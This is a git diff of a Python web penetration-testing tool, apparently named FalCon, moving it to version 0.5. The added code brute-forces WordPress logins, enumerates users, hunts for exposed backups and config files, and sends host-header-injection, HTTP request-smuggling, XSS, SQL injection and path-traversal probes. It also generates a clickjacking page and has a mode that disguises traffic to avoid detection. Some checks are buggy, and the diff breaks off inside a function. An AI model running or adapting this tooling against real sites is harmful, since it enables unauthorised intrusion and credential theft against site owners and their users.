@@ -11,8 +11,16 @@ from webdriver_manager.chrome import ChromeDriverManager
 import time
 from collections import Counter
 from concurrent.futures import ThreadPoolExecutor
+import ssl
 
-falcon_version=0.4
+
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+
+
+falcon_version=0.5
 
 ########## Ctrl+C Signal #########
 def signal_handler(sig, frame):
@@ -34,31 +42,39 @@ def banner():
  | |__ __ _| | |     ___ |  \\| |"""+Fore.WHITE+"""
  |  __/ _` | | |    / _ \\| . ` |
  | | | (_| | | |___| (_) | |\\  |"""+Fore.RED+"""
- |_|  \\__,_|_|\\_____\\___/|_| \\_| """+Fore.YELLOW+"""v0.4a (Beta)
+ |_|  \\__,_|_|\\_____\\___/|_| \\_| """+Fore.YELLOW+"""v0.5a (Beta)
      """+Fore.CYAN+"""OmidNasiri.P@Gmail.COM  
 """+Fore.WHITE)
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-u', help='URL Address [Example: site.com | DONT USE HTTPS://site.com]')
-parser.add_argument('-s', help='Output without banner')
-parser.add_argument('--all', help='test all pentest cases')
-parser.add_argument('--debug', help='Print Miss logs. For Debuging')
-parser.add_argument('--mode', help='Check Specific Cases, Example: --mode a,b,c,d,e,f')
+parser.add_argument('-c', help='Example: -c cms,ue,bf,bk,lp,ip | ue (UserEnumeration) | bf(Wordpress Bruteforce) | cms (cms detection) | wpp (Wordpress Plugin Discovery+Versions) | th (Target Security Headers) | bk (Backup file) | lp (Login Page) | dir (Directory Browsing) | wb (WayBack Machine) | dork (Google Dork) | ip (IP Info) | er (Error Finding) | wpc (Wordpress Version + Default Page + Register) | ssl (SSL Scan) | waf (WAF Detection) | nmap (Nmap) | wps (WPScan) | nuc (Nuclei)')
+parser.add_argument('-m', help='Example: -m all,hide (you can use both) | all: execute & print all of actions | Hide: Change User-Agent & Some sections are disabled to avoid detection.')
+parser.add_argument('--api', help='Example: -api [Your_API] |')
 #parser.add_argument('', help='')
 parser.add_argument('--update', help='Check for new version')
 args = parser.parse_args()
 
 target = args.u
-debug = args.debug
-all = args.all
-mode = args.mode
+argC = args.c
+mode = args.m
+update = args.update
 
 
 target_https='https://'+target
 target_http='http://'+target
-headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0 Safari/537.36'
-}
+
+if 'hide' in mode:
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0 Safari/537.36'}
+else:
+    headers = {'User-Agent': 'FalCon/0.4 (FalCon https://github.com/Noob2Pr0/FalCoN) OmidNP(https://www.linkedin.com/in/omid-nasiri-pouya-4b2241294/)'}
+
+
+#### Vul Section
+global vul_list
+vul_list = []
+
+
 
 ####### CREATE TARGET DIRECTORY #######
 def target_mkdir():
@@ -85,47 +101,12 @@ def target_check(headers):
             print("\n"+Fore.MAGENTA+"[HTTPS]"+Fore.WHITE,http_response.status_code)
         elif final_url.startswith("http"):
             print(Fore.GREEN+"\n[FOUND]","[HTTP]"+Fore.WHITE,http_response.status_code)
+            global target_https
             target_https = target_http
 
     except requests.exceptions.RequestException as e:
         print(f"An error occurred: {e}")
-
-
-
-
-
-
-
-"""
-    curl_response = requests.get(target_https,verify=False,headers=headers)
-    curl_response2 = requests.get(target_http,verify=False,headers=headers,allow_redirects=False) 
-    #print(target)
-    if curl_response.status_code in range(200,350):
-        target_path = os.path.join(target, "HEADERS.txt")
-        f=  open(target_path, "w", encoding="utf-8")
-        print(Fore.YELLOW+'\nCHECK TARGET',Fore.WHITE)
-        print(Fore.YELLOW+'[HTTPS]'+Fore.GREEN+' ENABLE '+Fore.WHITE)
-        if curl_response2.status_code in range(200,250):
-            if 'https' in curl_response2:
-                print(Fore.YELLOW+'[HTTP]'+Fore.RED+' DISABLE '+Fore.WHITE)
-        else:
-            print(Fore.YELLOW+'[HTTP]'+Fore.GREEN+' ENABLE '+Fore.WHITE)
-            print(Fore.YELLOW+'\nHTTP RESPONSE HEADERS',Fore.WHITE)
-            print(Fore.GREEN+'Target',target,'respose code is',curl_response2.status_code,Fore.WHITE)
-            http_headers = curl_response2.headers
-            http_readable_headers = "\n".join([f"{key}: {value}" for key, value in http_headers.items()])
-            f.write(http_readable_headers)
-        print(Fore.GREEN+'Target',target,'respose code is',curl_response.status_code,Fore.WHITE)
-        print(Fore.YELLOW+'\nHTTPS RESPONSE HEADERS',Fore.WHITE)
-        headers = curl_response.headers
-        readable_headers = "\n".join([f"{key}: {value}" for key, value in headers.items()])
-        
-        f.write(readable_headers)
-        f.close()
-        print(readable_headers)
-    else:
-        print(Fore.YELLOW+'Target',target,'respose code is',curl_response.status_code+Fore.WHITE)
-"""
+    #print(target_https)
 
 ############## NMAP ##############
 def nmap():
@@ -150,12 +131,12 @@ def backup_file(headers):
         backup_file_list = [
             'wp-config.zip', 'wp-config.bak', 'wp-config.txt', 'wp-config.php.zip', 'wp-config.php.bak', 'wp-config.php.txt',
             'error_log', 'public_html.zip', target_nodomain + '.zip', 'backup.zip', 'backup.tar.gz', 'backup.sql', 
-            target_nodomain + '.sql', 'wp-content-backup.zip', 'database-backup.sql', 'backup-website.zip', 
+            target_nodomain + '.sql', 'wp-content-backup.zip', 'database-backup.sql', 'backup-website.zip', 'site.zip',
             'backup-' + target_nodomain + '.zip', 'fullbackup.zip', 'full-' + target_nodomain + '.zip', 'wp-db.zip', 
             'public_html-backup.tar.gz', 'public_html-backup.zip', 'backup.bak', 'backup.7z', 'full_backup.tar.gz'
         ]
         def check_and_save_backup(bak):
-            backup_url = 'https://' + target + "/" + bak
+            backup_url = target_https + "/" + bak
             curl_response = requests.get(backup_url, verify=False, headers=headers)
             if curl_response.status_code == 200:
                 print(Fore.GREEN+'[FOUND]'+Fore.WHITE,backup_url)
@@ -169,7 +150,7 @@ def backup_file(headers):
                 with open(target_path, "w", encoding="utf-8") as f:
                     f.write(backup_data)
             else:
-                if all != None:
+                if 'all' in mode:
                     print(Fore.MAGENTA+'[MISS]'+Fore.WHITE,backup_url)
                     #print(Fore.CYAN + backup_url, ":", Fore.RED + str(curl_response.status_code) + Fore.WHITE)
 
@@ -255,19 +236,6 @@ def wp_user_enum(headers):
                         f.write(username + '\n')
         #print("\nCollected Usernames:", username_list)
 
-        """
-        ##### User Enum by WP-JSON
-        json_list = ['/wp-json/wp/v2/users','/?rest_route=/wp/v2/usErs','/section/news?rest_route=/wp/v2/usErs']
-        print(Fore.CYAN+'\n'+'[WP-JSON]'+Fore.WHITE)
-        f.write('\n [WP-JSON] \n')
-        for json_item in json_list:
-            curl_response = requests.get(target_https+json_item,verify=False,allow_redirects=False,headers=headers,timeout=30)
-            if curl_response.status_code == 200:
-                json_data = json.loads(curl_response.content)
-                for json_data_item in json_data:
-                    print(Fore.GREEN+'[FOUND]',Fore.WHITE+json_data_item['link'])
-                    f.write(json_data_item['link']+'\n')
-        """
 
 
         ##### User Enum by rss/feed
@@ -368,8 +336,8 @@ def ipinfo(headers):
     target_path = os.path.join(target, "IP_INFO.txt")
     f=  open(target_path, "w", encoding="utf-8")
     ip_address = socket.gethostbyname(target)
-    print(target+Fore.YELLOW+' IP '+Fore.GREEN+ip_address+Fore.WHITE)
-    f.write(target+' IP '+ip_address)
+    print(Fore.CYAN+'[Target IP] '+Fore.GREEN+ip_address+Fore.WHITE)
+    f.write('[Target IP] '+ip_address)
     curl_response = requests.get('https://ipinfo.io/widget/demo/'+ip_address,verify=False,headers=headers)
     if curl_response.status_code == 200:
         f.write('\n\n'+str(curl_response.content))
@@ -377,7 +345,7 @@ def ipinfo(headers):
     else:
         f.write('\nhttps://ipinfo.io/widget/demo/'+ip_address+'  YOUR REGION HAVE BEEN BOCKED!!!')
         f.write('\nHTTP STATUS CODE: '+str(curl_response.status_code))
-        print('HTTP STATUS CODE:',Fore.YELLOW,curl_response.status_code)
+        print(Fore.RED+'[ERROR]',Fore.YELLOW,'['+str(curl_response.status_code)+']')
         print(Fore.RED+'YOUR REGION HAVE BEEN BOCKED!!!'+Fore.WHITE)
     f.close()
 
@@ -464,7 +432,7 @@ def wp_install(headers):
 ##### WP VERSION DISCOVERY
 def wp_version(headers):
     f = open(target+"\\WP_VERSION.txt", "w", encoding="utf-8")
-    print(Fore.YELLOW+'\nWORDPRESS VERSION DISCOVERY'+Fore.WHITE)
+    print(Fore.YELLOW+'\n[WP VERSION]'+Fore.WHITE)
     try:
         response = requests.get('https://'+target,verify=False,headers=headers)
         if response.status_code != 200:
@@ -549,65 +517,6 @@ def wp_plugin(headers):
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-"""
-    target_path = os.path.join(target, "WP_PLUGINS.txt")
-    f=  open(target_path, "w", encoding="utf-8")
-    print(Fore.YELLOW+'\n[WP Plugin Version]'+Fore.WHITE)
-    response = requests.get('https://'+target, verify=False,headers=headers)
-    soup = BeautifulSoup(response.content, 'html.parser')
-    print(Fore.CYAN+'     [Link-TAG]'+Fore.WHITE)
-    f.write('###### Link Tag href Value ######'+'\n')
-    regex = r'\/plugins\/([^\/]+)'
-    regex2 = r'\?ver=(.*)'
-    for link_tag in soup.find_all('link', href=True):
-        if '/plugins/' in link_tag['href']:
-            #print(link_tag['href']) 
-            match = re.search(regex, link_tag['href'])
-            match2 = re.search(regex2, link_tag['href'])
-            if match:
-                if match2:
-                    with open(target_path, "r", encoding="utf-8") as file:
-                        content = file.read()
-                        #### BADAN BAYAD DOROSTESH KONAM TEKRARI PRINT NAKONE
-                        if str(match.group(1)) in content:
-                            pass
-                        else:
-                            print(match.group(1),Fore.GREEN,match2.group(1)+Fore.WHITE)
-                            f.write(match.group(1)+' '+match2.group(1)+'\n')
-    print(Fore.CYAN+"\n     [Script-TAG]"+Fore.WHITE)
-    f.write('\n##### Script Tag src Value #####'+'\n')
-    for script_tag in soup.find_all('script', src=True):
-        if '/plugins/' in script_tag['src']:
-            match = re.search(regex, script_tag['src'])
-            match2 = re.search(regex2, script_tag['src'])
-            if match:
-                if match2:
-                    with open(target_path, "r", encoding="utf-8") as file:
-                        content = file.read()
-                        #### BADAN BAYAD DOROSTESH KONAM TEKRARI PRINT NAKONE
-                        if str(match.group(1)) in content:
-                            pass
-                        else:
-                            print(match.group(1),Fore.GREEN,match2.group(1)+Fore.WHITE)
-                            f.write(match.group(1)+' '+match2.group(1)+'\n')
-            #print(script_tag['src'])
-            #f.write(script_tag['src']+'\n')
-    f.close()
- """
-
-
 ##### FILE + DIR FUZZ
 def ffuf(headers):
     print(Fore.YELLOW+'\nCreate ffuf command list'+Fore.WHITE)
@@ -629,11 +538,6 @@ def ffuf(headers):
 
 
 ##### ERROR DISCOVERY
-from colorama import Fore, init
-from concurrent.futures import ThreadPoolExecutor
-import os
-import requests
-
 def error(headers):
     # Initialize colorama for color formatting
     init(autoreset=True)
@@ -642,6 +546,7 @@ def error(headers):
     print(Fore.YELLOW + '\n[ERRORS]' + Fore.WHITE)
 
     url_list = [
+        '/robots.txt','/sitemap.xml','/images','/assets/js','/js','/img','/fonts','/content/uploads','/wp-content/uploads','/sitemap_index.xml','/uploads','/_next',
         '/FAL_CON.php', '/FAL_CON.aspx', '/?FAL_CON=FAL_CON', '/verylongpathnameexceedinglengthncaslcnaslkamcs',
         '/../../../../etc/passwd', '/uploads/', '/wp-content/uploads/', '/?id="order by 1=1--',
         '/?id=<script>alert(1)</script>', '/admin/', '/api/v1/', '/api/v2/', '/api/users/', '/api', '/wp-admin',
@@ -663,16 +568,20 @@ def error(headers):
     # Dictionary to store the first occurrence of each status code
     printed_status_codes = {}
 
+    # Lists to store unique URLs with 200 and 302 status codes
+    global http_200300_list
+    http_200300_list = []
+
     # Request task for multithreading
     def request_task(method, url_item):
         try:
             # Send requests based on the HTTP method
             if method == 'GET':
-                curl_response = requests.get(target_https + url_item, verify=False, headers=headers)
+                curl_response = requests.get(target_https + url_item, verify=False, headers=headers,allow_redirects=False)
             elif method == 'POST':
-                curl_response = requests.post(target_https + url_item, json=data, verify=False, headers=headers)
+                curl_response = requests.post(target_https + url_item, json=data, verify=False, headers=headers,allow_redirects=False)
             elif method == 'PUT':
-                curl_response = requests.put(target_https + url_item, json=data, verify=False, headers=headers)
+                curl_response = requests.put(target_https + url_item, json=data, verify=False, headers=headers,allow_redirects=False)
 
             # Extract status code
             curl_st = str(curl_response.status_code)
@@ -681,12 +590,13 @@ def error(headers):
             if curl_st not in printed_status_codes:
                 printed_status_codes[curl_st] = url_item  # Save the URL for the status code
                 # Check for relevant status codes to display
-                if int(curl_st) in [200, 404, 401, 403] or 500 <= int(curl_st) <= 599:
+                if int(curl_st) in [200, 404, 401, 403, 302] or 500 <= int(curl_st) <= 599:
                     color = {
                         '200': Fore.MAGENTA,
                         '404': Fore.GREEN,
                         '401': Fore.GREEN,
                         '403': Fore.GREEN,
+                        '302': Fore.CYAN,
                         '500': Fore.GREEN,
                         '501': Fore.GREEN,
                         '502': Fore.GREEN,
@@ -697,9 +607,21 @@ def error(headers):
                     # Write to file
                     f.write(f"Method: {method} Status Code: {curl_st} URL: {target_https + url_item}\n")
 
+            # Append unique URLs with 200 status code to http_200_list (capped at 5)
+            if curl_st == '200' and len(http_200300_list) < 30 and url_item not in http_200300_list:
+                http_200300_list.append(url_item)
+
+            # Append unique URLs with 302 status code to http_302_list (capped at 5)
+            if curl_st == '302' and len(http_200300_list) < 30 and url_item not in http_200300_list:
+                http_200300_list.append(url_item)
+
+            if curl_st == '301' and len(http_200300_list) < 30 and url_item not in http_200300_list:
+                http_200300_list.append(url_item)
+
         except Exception as e:
             # Handle request errors
-            print(Fore.RED + f"Error during {method} request for {url_item}: {str(e)}" + Fore.WHITE)
+            pass
+            #print(Fore.RED + f"Error during {method} request for {url_item}: {str(e)}" + Fore.WHITE)
 
     # Multithreading with ThreadPoolExecutor
     with ThreadPoolExecutor(max_workers=5) as executor:
@@ -714,8 +636,13 @@ def error(headers):
 
 
 
+
+
+
+
 ##### LOGIN PAGE FINDER
 def login(headers):
+    loginfound = '0'
     target_path = os.path.join(target, "LOGIN.txt")
     f=  open(target_path, "w", encoding="utf-8")
     print(Fore.YELLOW + '\n[Login Page]' + Fore.WHITE)
@@ -730,18 +657,21 @@ def login(headers):
                     '/logon.php', '/login.asp', '/login.aspx', '/login.html', '/login.php', '/login.jsp', '/logon.asp', '/logon.aspx',
                     '/logon.jsp', '/phpmyadmin', '/phpmyadmin/', '/phpmyadmin/index.php', '/signin', '/signin/', '/webeditor.php',
                     '/wp-admin', '/wp-admin/', '/wp-login.php','/pma','/webmail','/roundcube','/auth/admin-controlpanel/login',
-                    '/admin-controlpanel/login','/auth/admin-controlpanel/','/admin-controlpanel/',':2222']
+                    '/admin-controlpanel/login','/auth/admin-controlpanel/','/admin-controlpanel/',':2222','/ahmadimehranlogin/']
 
         def check_login_page(login_item):
+            global loginfound ,cj_urls_list
+            cj_urls_list = []
             curl_response = requests.get(target_https + login_item, verify=False, headers=headers)
+            #print(login_item)
             if curl_response.status_code == 200:
+                cj_urls_list.append(str(login_item))
                 print(Fore.GREEN+'[FOUND]'+Fore.WHITE,target_https + login_item)
+                loginfound='1'
                 #print('URL: ' + Fore.CYAN + target_https + login_item + Fore.WHITE + ' Status Code:' + Fore.GREEN + str(curl_response.status_code) + Fore.WHITE)
                 f.write(target_https + login_item + '\n')
-                global loginfound
-                loginfound=True
             else:
-                if all != None:
+                if 'all' in mode:
                     print(Fore.MAGENTA+'[MISS]'+Fore.WHITE,target_https + login_item)
                     #print('URL: ' + Fore.CYAN + target_https + login_item + Fore.WHITE + ' Status Code:' + Fore.RED + str(curl_response.status_code) + Fore.WHITE)
 
@@ -750,9 +680,8 @@ def login(headers):
             for future in concurrent.futures.as_completed(futures):
                 future.result()
     except:
-        if loginfound != True:
+        if loginfound != '0':
             print(Fore.RED + '\nNot Found' + Fore.WHITE)
-
 
 
 ##### Check Security Headers
@@ -1012,22 +941,79 @@ def dork():
 
 
 
-##### Becuse of Dependensies and Platform this part of code check the OS platform and deside to execute the test cases or NOT
-def more_test_case(headers):
-    plat=platform.system()
-    #print(plat)
-    if plat == "Linux":
-        sslscan()
-        #wafw00f(headers)
-        ##nmap()
-        #subfinder(headers)
-        #ffuf()
-        #wp_scan(headers)
-        #nuclei()
+def waf(headers):
+    print(Fore.YELLOW + '\n' + '[WAF]' + Fore.WHITE)
+    waf_list=['cloudflare','Wordfence','bitninja','akamai','ArvanCloud','fortiweb','citrix','BARRACUDA','ModSecurity','WebKnight','AWSALB','AWS Elastic Load Balancer (Amazon)','Client IP:',
+          'Your support ID is:','BIG-IP AppSec Manager (F5 Networks)','Intrusion Prevention','BigIP','FortiGate']
+    uri_list=['','/?a=%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E&b=UNION+SELECT+ALL+FROM+information_schema+AND+%27+or+SLEEP%285%29+or+%27&c=..%2F..%2F..%2F..%2Fetc%2Fpasswd']
+    waffound=False
+    for uri_item in uri_list:
+        waf_target=target_https+uri_item
+
+        try:
+            waf_request = requests.get(waf_target,verify=False,headers=headers,timeout=30,allow_redirects=False)
+            #print(waf_request.status_code)
+        except:
+            if waffound != True:
+                print(Fore.GREEN+'[FOUND]'+Fore.CYAN,'Target Using WAF',Fore.RED+'But No Model Detected!',Fore.WHITE)
+                waffound=True
+                break
+        
+        for waf in waf_list:
+            #print('check '+waf)
+            #print(waf_request.headers)
+            #print(Fore.GREEN+'[PAYLOAD]'+Fore.WHITE,waf_target)
+            #print(waf_request.status_code)
+            #print(waf_request.text)
+            if waf in str(waf_request.content):
+                if waf == waf_list[13]:
+                    print(Fore.GREEN+'[PAYLOAD]'+Fore.WHITE,waf_target)
+                    print(Fore.GREEN+'[FOUND]'+Fore.CYAN,waf_list[14],Fore.WHITE)
+                    waffound=True
+                if waf is waf_list[15]:
+                    print(Fore.GREEN+'[PAYLOAD]'+Fore.WHITE,waf_target)
+                    print(Fore.GREEN+'[FOUND]'+Fore.CYAN,waf_list[17],Fore.WHITE)
+                    waffound=True
+                if waf is waf_list[16]:
+                    print(Fore.GREEN+'[PAYLOAD]'+Fore.WHITE,waf_target)
+                    print(Fore.GREEN+'[FOUND]'+Fore.CYAN,waf_list[14],Fore.WHITE)
+                    waffound=True 
+                else:
+                    if waffound != True:
+                        print(Fore.GREEN+'[PAYLOAD]'+Fore.WHITE,waf_target)
+                        print(Fore.GREEN+'[FOUND]'+Fore.CYAN,waf,Fore.WHITE)
+                        waffound=True
+            if waf in str(waf_request.headers):
+                print(Fore.GREEN+'[PAYLOAD]'+Fore.WHITE,waf_target)
+                print(Fore.GREEN+'[FOUND]'+Fore.CYAN,waf,Fore.WHITE)
+                waffound=True
+            if str(waf_request.status_code) == '406':
+                print(Fore.GREEN+'[PAYLOAD]'+Fore.WHITE,waf_target)
+                print(Fore.GREEN+'[FOUND]'+Fore.CYAN,waf_list[9],Fore.WHITE)
+                waffound=True
+            if str(waf_request.status_code) == '999':
+                print(Fore.GREEN+'[PAYLOAD]'+Fore.WHITE,waf_target)
+                print(Fore.GREEN+'[FOUND]'+Fore.CYAN,waf_list[10],Fore.WHITE)
+                waffound=True
+            if waf_request.status_code in range(500-599):
+                print(Fore.GREEN+'[PAYLOAD]'+Fore.WHITE,waf_target)
+                print(Fore.RED+'[ERROR]',Fore.WHITE+'['+waf_request.status_code+']')
+                print(Fore.GREEN+'[FOUND]'+Fore.CYAN,'Target Using WAF',Fore.RED+'But No Model Detected!',Fore.WHITE)
+                waffound=True
+        if str(waf_request.status_code) == '403':
+            if waffound != True:
+                print(Fore.GREEN+'[FOUND]'+Fore.CYAN,'Target Using WAF',Fore.RED+'But No Model Detected!',Fore.WHITE)
+                waffound=True
+
+    if waffound != True:
+        if waf_request.status_code == 200:
+            print(Fore.GREEN+'[FOUND]'+Fore.CYAN,'Target Not Using WAF',Fore.RED+'>:)',Fore.WHITE)
+        else:
+            print(Fore.GREEN+'[FOUND]'+Fore.CYAN,'Target Using WAF',Fore.RED+'But No Model Detected!',Fore.WHITE)
+            waffound=True
 
 
-
-def wp_bruteforce_task(username, bfheaders, url_list, proxies):
+def wp_bruteforce_task(username, bfheaders, url_list):
     try:
         # Dynamically generate the passwords list for each username
         passwords = [
@@ -1060,11 +1046,18 @@ def wp_bruteforce_task(username, bfheaders, url_list, proxies):
                             return  # Exit the function on success
                     else:
                         print(Fore.RED + "[Failed]" + Fore.CYAN, "[USERNAME]" + Fore.WHITE, username, Fore.CYAN + "[PASSWORD]" + Fore.WHITE, password)
+        print(Fore.GREEN+'[FOUND]'+Fore.RED,'Target have Weak Lockout Mechanism Vulnerability'+Fore.WHITE)
+        print(Fore.GREEN+'[FOUND]'+Fore.RED,'Target have Rate Limit Vulnerability'+Fore.WHITE)
+        vul_list.append('Weak Lockout Mechanism Vulnerability')
+        vul_list.append('Rate Limit Vulnerability')
     except Exception as e:
         print(Fore.RED + 'Error:' + Fore.WHITE, str(e))
+        print(Fore.MAGENTA+'[SAFE]'+Fore.WHITE,'Target have not Weak Lockout Mechaniesm Vulnerability')
+        print(Fore.MAGENTA+'[SAFE]'+Fore.WHITE,'Target have not Rate Limit Vulnerability')
 
-def wp_bruteforce(username_list, headers):
+def wp_bruteforce(username_list):
     print(Fore.YELLOW + '\n' + '[WP BruteForce]' + Fore.WHITE)
+    global bfheaders
     bfheaders = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0 Safari/537.36',
         'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check; path=/; secure'
@@ -1086,6 +1079,368 @@ def wp_bruteforce(username_list, headers):
 
 
 
+def header_injection(headers):
+    print(Fore.YELLOW + '\n' + '[HOST HEADER INJECTION]' + Fore.WHITE)
+
+    for target_path in http_200300_list:
+        hhi = os.path.join(target, "HOST_HEADER_INJECTION.txt")
+        try:
+            if not target_https.startswith("http://") and not target_https.startswith("https://"):
+                print("Please include 'http://' or 'https://' in the URL.")
+                return
+
+            # Setting a malicious Host header
+            headers = {
+                "Host": "omidnasiri.com"
+            }
+
+            # Sending the request
+            response = requests.get(target_https + target_path, headers=headers, allow_redirects=False, timeout=10)
+
+            # Checking if the server processes the malicious Host header
+            if "omidnasiri.com" in response.headers.get("Location", ""):
+                print(Fore.GREEN+"[Verify]"+Fore.WHITE,"in Location Header")
+            if "omidnasiri.com" in response.text:
+                print(Fore.GREEN+"[Mabye F/P]"+Fore.WHITE,"Not in Location Header. just find in response body")
+                with open(hhi, "w", encoding="utf-8") as f:
+                    print(Fore.GREEN + "[FOUND] Host Header Injection Vulnerability" + Fore.WHITE, target_https + target_path)
+                    print(Fore.GREEN + "[SAVED] in " + Fore.WHITE, str(hhi))
+                    vul_list.append('Host Header Injection vulnerability '+Fore.WHITE+target_https+target_path)
+
+                    # Save request headers
+                    request_headers = str(headers)  # Convert request headers to string
+                    # Save response headers
+                    response_headers = str(response.headers)  # Convert response headers to string
+
+                    # Save everything to the file
+                    f.write("HTTP Request Sent:\n" + request_headers + "\n\n")
+                    f.write("HTTP Response Received:\n" + response_headers + "\n\n")
+                    f.write("HTTP Response Body:\n" + response.text + "\n")
+
+                return
+            else:
+                pass
+
+        except requests.exceptions.ConnectionError:
+            print("Connection error: Unable to connect to the target website.")
+        except requests.exceptions.Timeout:
+            print("Request timed out: The server took too long to respond.")
+        except requests.exceptions.RequestException as e:
+            print(f"An error occurred while making the request: {e}")
+        except Exception as e:
+            print(f"An unexpected error occurred: {e}")
+
+
+
+
+
+
+
+
+#init(autoreset=True)
+
+def http_smuggling(http_200300_list, target, target_https, headers):
+    print(Fore.YELLOW + '\n[HTTP SMUGGLING]' + Fore.WHITE)
+    http_src_list = []
+    try:
+        # Initial HTTP GET to retrieve potential paths using Response.iter_content()
+        response = requests.get(target_https, verify=False, headers=headers, stream=True)
+        if response.status_code in [200, 302]:  # Considering both 200 and 302 HTTP statuses
+            content = b""
+            for chunk in response.iter_content(chunk_size=1024):  # Process in 1 KB chunks
+                if chunk:  # Ensure chunk isn't empty
+                    content += chunk
+
+            # Parse the collected content
+            soup = BeautifulSoup(content, "html.parser")
+            src_values = [tag.get("src") for tag in soup.find_all(src=True)]
+            http_src_list.extend(src_values[:10])
+        http_200300_list = http_src_list + http_200300_list
+
+        # Process each path for HTTP Smuggling vulnerability check
+        for target_path in http_200300_list:
+            try:
+                host = target
+                port = 443
+                if not host:
+                    print(Fore.RED + "Error: You must enter a valid domain." + Fore.WHITE)
+                    return
+
+                # SSL context for secure communication
+                context = ssl.create_default_context()
+                with socket.create_connection((host, port)) as sock:
+                    sock.settimeout(10)  # Set a timeout for the socket
+                    with context.wrap_socket(sock, server_hostname=host) as ssock:
+                        # Construct raw HTTP request with chunked transfer encoding
+                        raw_request = (
+                            f"GET {target_path} HTTP/1.1\r\n"
+                            f"Host: {host}\r\n"
+                            "Content-Length: 70\r\n"  # Adjusted to match your Burp Suite request
+                            "Transfer-Encoding: chunked\r\n"
+                            "Connection: keep-alive\r\n"
+                            "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0 Safari/537.36\r\n"
+                            "\r\n"
+                            "0\r\n"
+                            "\r\n"
+                            f"GET {target_path} HTTP/1.1\r\n"
+                            f"Host: {host}\r\n"
+                            "\r\n"
+                        )
+                        #print(Fore.YELLOW + "HTTP Request Being Sent:" + Fore.WHITE)
+                        #print(raw_request)
+
+                        # Send the request
+                        ssock.sendall(raw_request.encode("utf-8"))
+
+                        # Add a short delay to handle timing issues
+                        time.sleep(2)  # Increased delay to ensure the server processes the request
+
+                        # Receive the entire response
+                        response = b""
+                        while True:
+                            try:
+                                chunk = ssock.recv(4096)
+                                if not chunk:
+                                    break
+                                response += chunk
+                            except socket.timeout:
+                                break
+
+                        response = response.decode("utf-8", errors="replace")
+                        #print(Fore.GREEN + "\nHTTP Response Received:" + Fore.WHITE)
+                        #print(response)
+
+                        # Split the response into individual HTTP responses
+                        http_responses = response.split("HTTP/1.1")
+                        if len(http_responses) > 1:
+                            # Remove the empty string before the first "HTTP/1.1"
+                            http_responses = http_responses[1:]
+
+                            # Count the number of HTTP 200 or 302 responses
+                            count_200 = 0
+                            count_302 = 0
+                            for resp in http_responses:
+                                if "200 OK" in resp:
+                                    count_200 += 1
+                                if "302 Found" in resp:
+                                    count_302 += 1
+
+                            # Check for duplicate HTTP 200 or 302 responses
+                            if count_200 >= 2 or count_302 >= 2:
+                                smuggling_path = os.path.join(target, "HTTP_SMUGGLING_RESPONSE.txt")
+                                f = open(smuggling_path, "w", encoding="utf-8")
+                                f.write("HTTP Request Being Sent:\n"+raw_request+"\nHTTP Response Received:\n"+response)
+                                f.close()
+                                print(Fore.GREEN + "[FOUND] HTTP Smuggling Vulnerability" + Fore.WHITE,target_https + target_path)
+                                print(Fore.GREEN + "[SAVE] "+target+"\\HTTP_SMUGGLING_RESPONSE.txt" + Fore.WHITE)
+                                vul_list.append('HTTP Smuggling vulnerability '+Fore.WHITE+target_https+target_path)
+                                #print(Fore.YELLOW + "HTTP Request Being Sent:" + Fore.WHITE)
+                                #print(raw_request)
+                                #print(Fore.GREEN + "\nHTTP Response Received:" + Fore.WHITE)
+                                #print(response)
+                                return
+                            else:
+                                pass
+                                #print(Fore.MAGENTA + "[SAFE] No HTTP Smuggling detected." + Fore.WHITE)
+                        else:
+                            #pass
+                            print(Fore.MAGENTA + "[SAFE] No HTTP Smuggling detected." + Fore.WHITE)
+            except socket.timeout as e:
+                print(Fore.RED + f"Socket timeout error: {e}" + Fore.WHITE)
+            except ssl.SSLError as e:
+                print(Fore.RED + f"SSL error: {e}" + Fore.WHITE)
+            except Exception as e:
+                print(Fore.RED + f"An error occurred while processing {target_path}: {e}" + Fore.WHITE)
+    except requests.RequestException as e:
+        print(Fore.RED + f"Error during initial HTTP GET: {e}" + Fore.WHITE)
+    except Exception as e:
+        print(Fore.RED + f"Unexpected error: {e}" + Fore.WHITE)
+
+
+
+
+
+def clickjacking_exploit(full_url, output_file="clickjacking_exploit.html"):
+    html_content = f"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Test</title>
+    <style>
+        /* Overlay styling */
+        .overlay {{
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+           /* background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent black */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1;
+        }}
+
+        /* Button styling */
+        .overlay-button {{
+            padding: 15px 30px;
+            font-size: 18px;
+            color: white;
+            background-color: #850007;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: background-color 0.3s ease;
+        }}
+
+        .overlay-button:hover {{
+            background-color: #ff000d;
+        }}
+
+        /* Iframe styling */
+        iframe {{
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+             opacity: 1; /* Make the iframe semi-transparent */
+            z-index: 0;
+        }}
+    </style>
+</head>
+<body>
+    <!-- Overlay with a button -->
+    <div class="overlay">
+        <button class="overlay-button" onclick="alert('Hacker tricked you!')">
+            Evil Action!
+        </button>
+    </div>
+
+    <!-- Embedded iframe (target website) -->
+    <iframe src="{full_url}"></iframe>
+</body>
+</html>
+"""
+
+    # Write the HTML content to the output file
+    cj_path = os.path.join(target, "clickjacking_exploit.html")
+    #f.write("HTTP Request Being Sent:\n"+raw_request+"\nHTTP Response Received:\n"+response)
